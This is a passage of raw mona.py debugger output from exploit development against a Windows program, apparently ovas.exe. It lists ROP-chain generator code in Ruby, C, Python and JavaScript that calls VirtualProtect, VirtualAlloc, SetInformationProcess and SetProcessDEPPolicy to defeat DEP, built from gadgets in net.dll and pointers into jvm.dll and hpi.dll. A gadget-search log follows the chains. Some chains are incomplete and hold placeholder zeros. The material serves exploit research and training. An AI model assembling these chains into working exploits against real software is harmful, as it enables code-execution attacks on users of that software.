           ECX = lpOldProtect (ptr to W address)
           EDX = NewProtect (0x40)
           EBX = dwSize
           ESP = lPAddress (automatic)
           EBP = ReturnTo (ptr to jmp esp)
           ESI = ptr to VirtualProtect()
           EDI = ROP NOP (RETN)
           --- alternative chain ---
           EAX = ptr to &VirtualProtect()
           ECX = lpOldProtect (ptr to W address)
           EDX = NewProtect (0x40)
           EBX = dwSize
           ESP = lPAddress (automatic)
           EBP = POP (skip 4 bytes)
           ESI = ptr to JMP [EAX]
           EDI = ROP NOP (RETN)
           + place ptr to "jmp esp" on stack, below PUSHAD
          --------------------------------------------
          
          
          ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
          ----------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x6d2d68ee,  # POP EBP # RETN 0x14 [net.dll] 
                0x6d2d68ee,  # skip 4 bytes [net.dll]
                0x6d2d3284,  # POP EBX # RETN [net.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000201,  # 0x00000201-> ebx
                0x00000000,  # [-] Unable to find gadget to put 00000040 into edx
                0x6d2d2be2,  # POP ECX # RETN [net.dll] 
                0x6d2d9a07,  # &Writable location [net.dll]
                0x6d2d3282,  # POP EDI # POP ESI # POP EBX # RETN [net.dll] 
                0x6d2d1212,  # RETN (ROP NOP) [net.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d2d360b,  # POP ESI # RETN [net.dll] 
                0x6d2d4cef,  # JMP [EAX] [net.dll]
                0x6d2d6ad7,  # POP EAX # RETN 0x0C [net.dll] 
                0x6d3f8098,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000000,  # <- Unable to find ptr to 'jmp esp'
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x6d2d68ee,  // POP EBP // RETN 0x14 [net.dll] 
                0x6d2d68ee,  // skip 4 bytes [net.dll]
                0x6d2d3284,  // POP EBX // RETN [net.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x00000201,  // 0x00000201-> ebx
                0x00000000,  // [-] Unable to find gadget to put 00000040 into edx
                0x6d2d2be2,  // POP ECX // RETN [net.dll] 
                0x6d2d9a07,  // &Writable location [net.dll]
                0x6d2d3282,  // POP EDI // POP ESI // POP EBX // RETN [net.dll] 
                0x6d2d1212,  // RETN (ROP NOP) [net.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d2d360b,  // POP ESI // RETN [net.dll] 
                0x6d2d4cef,  // JMP [EAX] [net.dll]
                0x6d2d6ad7,  // POP EAX // RETN 0x0C [net.dll] 
                0x6d3f8098,  // ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x00000000,  // [-] Unable to find pushad gadget
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x00000000,  // <- Unable to find ptr to 'jmp esp'
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x6d2d68ee,  # POP EBP # RETN 0x14 [net.dll] 
                0x6d2d68ee,  # skip 4 bytes [net.dll]
                0x6d2d3284,  # POP EBX # RETN [net.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000201,  # 0x00000201-> ebx
                0x00000000,  # [-] Unable to find gadget to put 00000040 into edx
                0x6d2d2be2,  # POP ECX # RETN [net.dll] 
                0x6d2d9a07,  # &Writable location [net.dll]
                0x6d2d3282,  # POP EDI # POP ESI # POP EBX # RETN [net.dll] 
                0x6d2d1212,  # RETN (ROP NOP) [net.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d2d360b,  # POP ESI # RETN [net.dll] 
                0x6d2d4cef,  # JMP [EAX] [net.dll]
                0x6d2d6ad7,  # POP EAX # RETN 0x0C [net.dll] 
                0x6d3f8098,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000000,  # <- Unable to find ptr to 'jmp esp'
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u68ee%u6d2d" + // 0x6d2d68ee : ,# POP EBP # RETN 0x14 [net.dll] 
              "%u68ee%u6d2d" + // 0x6d2d68ee : ,# skip 4 bytes [net.dll]
              "%u3284%u6d2d" + // 0x6d2d3284 : ,# POP EBX # RETN [net.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadget to put 00000040 into edx
              "%u2be2%u6d2d" + // 0x6d2d2be2 : ,# POP ECX # RETN [net.dll] 
              "%u9a07%u6d2d" + // 0x6d2d9a07 : ,# &Writable location [net.dll]
              "%u3282%u6d2d" + // 0x6d2d3282 : ,# POP EDI # POP ESI # POP EBX # RETN [net.dll] 
              "%u1212%u6d2d" + // 0x6d2d1212 : ,# RETN (ROP NOP) [net.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u360b%u6d2d" + // 0x6d2d360b : ,# POP ESI # RETN [net.dll] 
              "%u4cef%u6d2d" + // 0x6d2d4cef : ,# JMP [EAX] [net.dll]
              "%u6ad7%u6d2d" + // 0x6d2d6ad7 : ,# POP EAX # RETN 0x0C [net.dll] 
              "%u8098%u6d3f" + // 0x6d3f8098 : ,# ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u0000%u0000" + // 0x00000000 : ,# <- Unable to find ptr to 'jmp esp'
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for SetInformationProcess() :
          --------------------------------------------
           EAX = SizeOf(ExecuteFlags) (0x4)
           ECX = &ExecuteFlags (ptr to 0x00000002)
           EDX = ProcessExecuteFlags (0x22)
           EBX = NtCurrentProcess (0xffffffff)
           ESP = ReturnTo (automatic)
           EBP = ptr to NtSetInformationProcess()
           ESI = <not used>
           EDI = ROP NOP (4 byte stackpivot)
          --------------------------------------------
          
          
          ROP Chain for SetInformationProcess() [(XP/2003 Server only)] :
          ---------------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into ebp
                0x00000000,  # [-] Unable to find ptr to &SetInformationProcess()
                0x00000000,  # [-] Unable to find gadget to put 00000022 into edx
                0x6d2d2be2,  # POP ECX # RETN [net.dll] 
                0x6d2d012c,  # &0x00000002 [net.dll]
                0x6d2d1211,  # POP EBX # RETN [net.dll] 
                0xffffffff,  # 0xffffffff-> ebx
                0x6d2d6ad7,  # POP EAX # RETN 0x0C [net.dll] 
                0x00000004,  # 0x00000004-> eax
                0x6d2d3282,  # POP EDI # POP ESI # POP EBX # RETN [net.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d2d3282,  # skip 4 bytes [net.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x00000000,  # [-] Unable to find pushad gadget
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find gadgets to pickup the desired API pointer into ebp
                0x00000000,  // [-] Unable to find ptr to &SetInformationProcess()
                0x00000000,  // [-] Unable to find gadget to put 00000022 into edx
                0x6d2d2be2,  // POP ECX // RETN [net.dll] 
                0x6d2d012c,  // &0x00000002 [net.dll]
                0x6d2d1211,  // POP EBX // RETN [net.dll] 
                0xffffffff,  // 0xffffffff-> ebx
                0x6d2d6ad7,  // POP EAX // RETN 0x0C [net.dll] 
                0x00000004,  // 0x00000004-> eax
                0x6d2d3282,  // POP EDI // POP ESI // POP EBX // RETN [net.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x6d2d3282,  // skip 4 bytes [net.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x00000000,  // [-] Unable to find pushad gadget
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into ebp
                0x00000000,  # [-] Unable to find ptr to &SetInformationProcess()
                0x00000000,  # [-] Unable to find gadget to put 00000022 into edx
                0x6d2d2be2,  # POP ECX # RETN [net.dll] 
                0x6d2d012c,  # &0x00000002 [net.dll]
                0x6d2d1211,  # POP EBX # RETN [net.dll] 
                0xffffffff,  # 0xffffffff-> ebx
                0x6d2d6ad7,  # POP EAX # RETN 0x0C [net.dll] 
                0x00000004,  # 0x00000004-> eax
                0x6d2d3282,  # POP EDI # POP ESI # POP EBX # RETN [net.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d2d3282,  # skip 4 bytes [net.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x00000000,  # [-] Unable to find pushad gadget
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadgets to pickup the desired API pointer into ebp
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to &SetInformationProcess()
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadget to put 00000022 into edx
              "%u2be2%u6d2d" + // 0x6d2d2be2 : ,# POP ECX # RETN [net.dll] 
              "%u012c%u6d2d" + // 0x6d2d012c : ,# &0x00000002 [net.dll]
              "%u1211%u6d2d" + // 0x6d2d1211 : ,# POP EBX # RETN [net.dll] 
              "%uffff%uffff" + // 0xffffffff : ,# 0xffffffff-> ebx
              "%u6ad7%u6d2d" + // 0x6d2d6ad7 : ,# POP EAX # RETN 0x0C [net.dll] 
              "%u0004%u0000" + // 0x00000004 : ,# 0x00000004-> eax
              "%u3282%u6d2d" + // 0x6d2d3282 : ,# POP EDI # POP ESI # POP EBX # RETN [net.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u3282%u6d2d" + // 0x6d2d3282 : ,# skip 4 bytes [net.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for SetProcessDEPPolicy() :
          --------------------------------------------
           EAX = <not used>
           ECX = <not used>
           EDX = <not used>
           EBX = dwFlags (ptr to 0x00000000)
           ESP = ReturnTo (automatic)
           EBP = ptr to SetProcessDEPPolicy()
           ESI = <not used>
           EDI = ROP NOP (4 byte stackpivot)
          --------------------------------------------
          
          
          ROP Chain for SetProcessDEPPolicy() [(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)] :
          ---------------------------------------------------------------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x6d2d3284,  # POP EBX # RETN [net.dll] 
                0x6d2d0011,  # &0x00000000 [net.dll]
                0x6d2d120e,  # POP EDI # POP ESI # POP EBP # POP EBX # RETN [net.dll] 
                0x6d2d120e,  # skip 4 bytes [net.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x00000000,  # [-] Unable to find pushad gadget
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x6d2d3284,  // POP EBX // RETN [net.dll] 
                0x6d2d0011,  // &0x00000000 [net.dll]
                0x6d2d120e,  // POP EDI // POP ESI // POP EBP // POP EBX // RETN [net.dll] 
                0x6d2d120e,  // skip 4 bytes [net.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x00000000,  // [-] Unable to find pushad gadget
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x6d2d3284,  # POP EBX # RETN [net.dll] 
                0x6d2d0011,  # &0x00000000 [net.dll]
                0x6d2d120e,  # POP EDI # POP ESI # POP EBP # POP EBX # RETN [net.dll] 
                0x6d2d120e,  # skip 4 bytes [net.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x00000000,  # [-] Unable to find pushad gadget
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
              "%u3284%u6d2d" + // 0x6d2d3284 : ,# POP EBX # RETN [net.dll] 
              "%u0011%u6d2d" + // 0x6d2d0011 : ,# &0x00000000 [net.dll]
              "%u120e%u6d2d" + // 0x6d2d120e : ,# POP EDI # POP ESI # POP EBP # POP EBX # RETN [net.dll] 
              "%u120e%u6d2d" + // 0x6d2d120e : ,# skip 4 bytes [net.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for VirtualAlloc() :
          --------------------------------------------
           EAX = NOP (0x90909090)
           ECX = flProtect (0x40)
           EDX = flAllocationType (0x1000)
           EBX = dwSize
           ESP = lpAddress (automatic)
           EBP = ReturnTo (ptr to jmp esp)
           ESI = ptr to VirtualAlloc()
           EDI = ROP NOP (RETN)
           --- alternative chain ---
           EAX = ptr to &VirtualAlloc()
           ECX = flProtect (0x40)
           EDX = flAllocationType (0x1000)
           EBX = dwSize
           ESP = lpAddress (automatic)
           EBP = POP (skip 4 bytes)
           ESI = ptr to JMP [EAX]
           EDI = ROP NOP (RETN)
           + place ptr to "jmp esp" on stack, below PUSHAD
          --------------------------------------------
          
          
          ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
          --------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x6d2d3547,  # POP EBP # RETN 0x0C [net.dll] 
                0x6d2d3547,  # skip 4 bytes [net.dll]
                0x6d2d1211,  # POP EBX # RETN [net.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000001,  # 0x00000001-> ebx
                0x00000000,  # [-] Unable to find gadget to put 00001000 into edx
                0x6d2d2be2,  # POP ECX # RETN [net.dll] 
                0x00000040,  # 0x00000040-> ecx
                0x6d2d120e,  # POP EDI # POP ESI # POP EBP # POP EBX # RETN [net.dll] 
                0x6d2d1212,  # RETN (ROP NOP) [net.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d2d35ab,  # POP ESI # RETN [net.dll] 
                0x6d2d4cef,  # JMP [EAX] [net.dll]
                0x6d2d6ad7,  # POP EAX # RETN 0x0C [net.dll] 
                0x6d1d408c,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000000,  # <- Unable to find ptr to 'jmp esp'
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x6d2d3547,  // POP EBP // RETN 0x0C [net.dll] 
                0x6d2d3547,  // skip 4 bytes [net.dll]
                0x6d2d1211,  // POP EBX // RETN [net.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x00000001,  // 0x00000001-> ebx
                0x00000000,  // [-] Unable to find gadget to put 00001000 into edx
                0x6d2d2be2,  // POP ECX // RETN [net.dll] 
                0x00000040,  // 0x00000040-> ecx
                0x6d2d120e,  // POP EDI // POP ESI // POP EBP // POP EBX // RETN [net.dll] 
                0x6d2d1212,  // RETN (ROP NOP) [net.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d2d35ab,  // POP ESI // RETN [net.dll] 
                0x6d2d4cef,  // JMP [EAX] [net.dll]
                0x6d2d6ad7,  // POP EAX // RETN 0x0C [net.dll] 
                0x6d1d408c,  // ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x00000000,  // [-] Unable to find pushad gadget
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x00000000,  // <- Unable to find ptr to 'jmp esp'
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x6d2d3547,  # POP EBP # RETN 0x0C [net.dll] 
                0x6d2d3547,  # skip 4 bytes [net.dll]
                0x6d2d1211,  # POP EBX # RETN [net.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000001,  # 0x00000001-> ebx
                0x00000000,  # [-] Unable to find gadget to put 00001000 into edx
                0x6d2d2be2,  # POP ECX # RETN [net.dll] 
                0x00000040,  # 0x00000040-> ecx
                0x6d2d120e,  # POP EDI # POP ESI # POP EBP # POP EBX # RETN [net.dll] 
                0x6d2d1212,  # RETN (ROP NOP) [net.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d2d35ab,  # POP ESI # RETN [net.dll] 
                0x6d2d4cef,  # JMP [EAX] [net.dll]
                0x6d2d6ad7,  # POP EAX # RETN 0x0C [net.dll] 
                0x6d1d408c,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000000,  # <- Unable to find ptr to 'jmp esp'
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u3547%u6d2d" + // 0x6d2d3547 : ,# POP EBP # RETN 0x0C [net.dll] 
              "%u3547%u6d2d" + // 0x6d2d3547 : ,# skip 4 bytes [net.dll]
              "%u1211%u6d2d" + // 0x6d2d1211 : ,# POP EBX # RETN [net.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadget to put 00001000 into edx
              "%u2be2%u6d2d" + // 0x6d2d2be2 : ,# POP ECX # RETN [net.dll] 
              "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
              "%u120e%u6d2d" + // 0x6d2d120e : ,# POP EDI # POP ESI # POP EBP # POP EBX # RETN [net.dll] 
              "%u1212%u6d2d" + // 0x6d2d1212 : ,# RETN (ROP NOP) [net.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u35ab%u6d2d" + // 0x6d2d35ab : ,# POP ESI # RETN [net.dll] 
              "%u4cef%u6d2d" + // 0x6d2d4cef : ,# JMP [EAX] [net.dll]
              "%u6ad7%u6d2d" + // 0x6d2d6ad7 : ,# POP EAX # RETN 0x0C [net.dll] 
              "%u408c%u6d1d" + // 0x6d1d408c : ,# ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u0000%u0000" + // 0x00000000 : ,# <- Unable to find ptr to 'jmp esp'
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
0BADF00D      ROP generator finished
0BADF00D  
0BADF00D  [+] Writing stackpivots to file stackpivot.txt
0BADF00D      Wrote 47 pivots to file 
0BADF00D  [+] Writing suggestions to file rop_suggestions.txt
0BADF00D      Wrote 73 suggestions to file
0BADF00D  [+] Writing results to file rop.txt (114 interesting gadgets)
0BADF00D      Wrote 114 interesting gadgets to file
0BADF00D  [+] Writing other gadgets to file rop.txt (215 gadgets)
0BADF00D      Wrote 215 other gadgets to file
0BADF00D  Done
0BADF00D  
0BADF00D  [+] This mona.py action took 0:00:19.672000
0BADF00D  [+] Command used:
0BADF00D  !mona rop -m jvm.dll
          
          ---------- Mona command started on 2018-10-30 04:49:28 (v2.0, rev 577) ----------
0BADF00D  [+] Processing arguments and criteria
0BADF00D      - Pointer access level : X
0BADF00D      - Only querying modules jvm.dll
0BADF00D  [+] Generating module info table, hang on...
0BADF00D      - Processing modules
0BADF00D      - Done. Let's rock 'n roll.
0BADF00D  [+] Preparing output file '_rop_progress_ovas.exe_29032.log'
0BADF00D      - (Re)setting logfile _rop_progress_ovas.exe_29032.log
0BADF00D  [+] Progress will be written to _rop_progress_ovas.exe_29032.log
0BADF00D  [+] Maximum offset : 40
0BADF00D  [+] (Minimum/optional maximum) stackpivot distance : 8
0BADF00D  [+] Max nr of instructions : 6
0BADF00D  [+] Split output into module rop files ? False
0BADF00D  [+] Enumerating 22 endings in 1 module(s)...
0BADF00D      - Querying module jvm.dll
0BADF00D      - Search complete :
0BADF00D         Ending : RETN 0x02, Nr found : 4
0BADF00D         Ending : RETN 0x0C, Nr found : 532
0BADF00D         Ending : RETN 0x1C, Nr found : 44
0BADF00D         Ending : RETN 0x0A, Nr found : 1
0BADF00D         Ending : RETN, Nr found : 5228
0BADF00D         Ending : RETN 0x20, Nr found : 46
0BADF00D         Ending : RETN 0x18, Nr found : 49
0BADF00D         Ending : RETN 0x08, Nr found : 825
0BADF00D         Ending : RETN 0x24, Nr found : 8
0BADF00D         Ending : RETN 0x28, Nr found : 4
0BADF00D         Ending : RETN 0x10, Nr found : 405
0BADF00D         Ending : RETN 0x00, Nr found : 21
0BADF00D         Ending : RETN 0x12, Nr found : 1
0BADF00D         Ending : RETN 0x14, Nr found : 180
0BADF00D         Ending : RETN 0x04, Nr found : 1727
0BADF00D      - Filtering and mutating 9075 gadgets
0BADF00D  ** It looks like you've configured the debugger to produce lowercase disassembly. Got it, all good **
